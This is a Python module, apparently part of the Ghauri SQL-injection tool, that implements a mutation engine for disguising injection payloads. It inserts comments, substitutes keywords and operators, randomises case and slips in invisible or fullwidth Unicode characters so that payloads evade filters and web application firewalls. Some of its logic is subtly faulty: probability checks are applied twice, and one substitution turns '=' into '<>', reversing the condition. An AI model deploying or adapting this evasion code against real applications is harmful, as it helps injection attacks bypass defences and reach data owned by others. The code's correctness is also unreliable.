# lib/core/mutators.py
"""
Modular polymorphic mutation engine for Ghauri
Each mutator is independent, has its own probability, and can be enabled/disabled.
Add new classes here as needed.
"""

import random
import string
from typing import List, Dict, Any

class Mutator:
    """Base class for all mutation strategies"""
    name: str
    probability: float = 0.65          # default chance this mutator is applied
    description: str = "Base mutator"

    def mutate(self, payload: str, context: Dict[str, Any]) -> str:
        """Apply mutation. context can contain content_type, dbms, method, etc."""
        raise NotImplementedError

    def __repr__(self) -> str:
        return f"{self.name} (p={self.probability})"


class CommentSmuggler(Mutator):
    name = "comment_smuggler"
    probability = 0.82
    description = "Inserts various comment styles at random positions"

    comments = [
        "/**/", "/* */", "-- ", "# ", " --+ ", "/*!*/", "-- -", " # ",
        "/*\n*/", "-- \n", "/**/\n", " -- comment -- ", "#\n"
    ]

    def mutate(self, payload: str, context: Dict[str, Any]) -> str:
        if random.random() > self.probability:
            return payload

        count = random.randint(1, min(4, len(payload) // 15 + 1))
        for _ in range(count):
            if len(payload) < 10:
                break
            pos = random.randint(0, len(payload))
            payload = payload[:pos] + random.choice(self.comments) + payload[pos:]
        return payload


class KeywordObfuscator(Mutator):
    name = "keyword_obfuscator"
    probability = 0.78
    description = "Replaces common keywords with synonyms / alternates"

    replacements = {
        "AND":      ["&&", " AND ", "/*AND*/", " INTERSECT SELECT ", " HAVING 1=1 "],
        "OR":       ["||", " OR ", " UNION SELECT ", " OR ALL "],
        "=":        [" LIKE ", " = ", "<>", " <=> ", " BETWEEN 1 AND 1 "],
        "1=1":      ["true", "!!1", "999>998", "1 LIKE 1", "1 BETWEEN 1 AND 1"],
        "substring": ["substr", "mid", "slice"],
        "true":     ["!!1", "1=1", "NOT FALSE"],
        "false":    ["!1", "0=1", "NOT TRUE"],
    }

    def mutate(self, payload: str, context: Dict[str, Any]) -> str:
        if random.random() > self.probability:
            return payload

        # Apply 1–2 replacements
        for _ in range(random.randint(1, 2)):
            key = random.choice(list(self.replacements.keys()))
            if key in payload:
                replacement = random.choice(self.replacements[key])
                payload = payload.replace(key, replacement, 1)  # only first occurrence
        return payload


class CaseRandomizer(Mutator):
    name = "case_randomizer"
    probability = 0.70
    description = "Randomizes case of SQL keywords"

    keywords = [
        "AND", "OR", "SELECT", "WHERE", "FROM", "LIKE", "BETWEEN", "TRUE", "FALSE",
        "UNION", "HAVING", "ORDER", "GROUP", "BY", "NOT", "IS", "NULL"
    ]

    def mutate(self, payload: str, context: Dict[str, Any]) -> str:
        if random.random() > self.probability:
            return payload

        for kw in self.keywords:
            if kw in payload.upper() and random.random() < 0.55:
                # 50% upper, 30% lower, 20% mixed
                r = random.random()
                if r < 0.5:
                    new = kw.upper()
                elif r < 0.8:
                    new = kw.lower()
                else:
                    new = kw.title()
                payload = payload.replace(kw, new, 1)
                payload = payload.replace(kw.lower(), new, 1)
                payload = payload.replace(kw.upper(), new, 1)
        return payload


class UnicodeSmuggler(Mutator):
    name = "unicode_smuggler"
    probability = 0.45
    description = "Inserts invisible / homoglyph unicode characters"

    tricks = [
        ('=',   '\u202e=\u202c'),      # RTL override around =
        ('AND', 'A\u200dND'),          # zero-width joiner
        ('OR',  'O\u200cR'),           # zero-width non-joiner
        ('1',   '１'),                 # fullwidth digit
        ('=',   '＝'),                 # fullwidth equals
        (' ',   '\u200b'),             # zero-width space
        ('true', 'ｔｒｕｅ'),           # fullwidth letters
    ]

    def mutate(self, payload: str, context: Dict[str, Any]) -> str:
        if random.random() > self.probability:
            return payload

        count = random.randint(1, 2)
        for _ in range(count):
            old, new = random.choice(self.tricks)
            if old in payload:
                payload = payload.replace(old, new, 1)  # only once per trick
        return payload


# Registry – add new mutators here as you create them
DEFAULT_MUTATORS: List[Mutator] = [
    CommentSmuggler(),
    KeywordObfuscator(),
    CaseRandomizer(),
    UnicodeSmuggler(),
    # Add more later: JsonMutator, GraphQLMutator, HeaderSmuggler, etc.
]


def apply_mutators(payload: str, context: Dict[str, Any] = None) -> str:
    """
    Main entry point — called from engine when preparing a payload.
    context can contain: {'content_type': '...', 'dbms': '...', 'method': 'GET/POST', ...}
    """
    if context is None:
        context = {}

    for mutator in DEFAULT_MUTATORS:
        if random.random() < mutator.probability:
            payload = mutator.mutate(payload, context)

    return payload
